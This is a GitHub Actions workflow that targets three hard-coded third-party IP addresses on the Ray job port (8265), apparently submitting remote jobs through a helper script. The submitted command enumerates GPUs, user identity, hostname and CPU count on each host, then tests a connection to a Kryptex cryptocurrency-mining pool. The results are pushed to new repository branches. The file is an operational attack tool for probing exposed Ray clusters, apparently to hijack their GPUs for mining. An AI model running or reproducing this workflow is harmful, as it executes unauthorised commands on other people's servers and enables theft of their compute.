name: vantage-ray
on:
  workflow_dispatch:
    inputs:
      raydump:
        description: "dump jobs list summary for a host"
        default: ""
permissions:
  contents: write
jobs:
  ray:
    runs-on: ubuntu-latest
    timeout-minutes: 40
    steps:
      - uses: actions/checkout@v4
      - name: egress
        run: curl -s -m 10 https://api.ipify.org; echo
      - name: probe-and-submit
        run: |
          set +e
          mkdir -p vantage/out
          for H in 24.165.187.21:8265 151.226.121.204:8265 218.238.49.81:8265; do
            echo "########## $H"
            RAY_HOST=$H CMD='nvidia-smi -L 2>&1 | head -10; echo "---"; id; hostname; echo "---"; ls /dev/nvidia* 2>/dev/null | wc -l; echo "---"; nproc; echo "---"; python3 -c "import socket;s=socket.socket();s.settimeout(5);s.connect((\"prl-sg.kryptex.network\",7048));print(s.recv(120))" 2>&1 | head -5' \
              python3 -u vantage/ray.py 2>&1 | tee -a vantage/out/ray_$(echo $H | tr ':' '_').log
          done
      - name: jobs-summary
        run: |
          set +e
          python3 vantage/raysum.py
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: vray
          path: vantage/out/
      - name: publish
        if: always()
        run: |
          set +e
          git config user.email bot@ul.local; git config user.name ul
          git checkout -b vray/${{ github.run_id }}
          git add -f vantage/out/
          git commit -m "vray ${{ github.run_id }}"
          git push -q origin HEAD:vray/${{ github.run_id }}
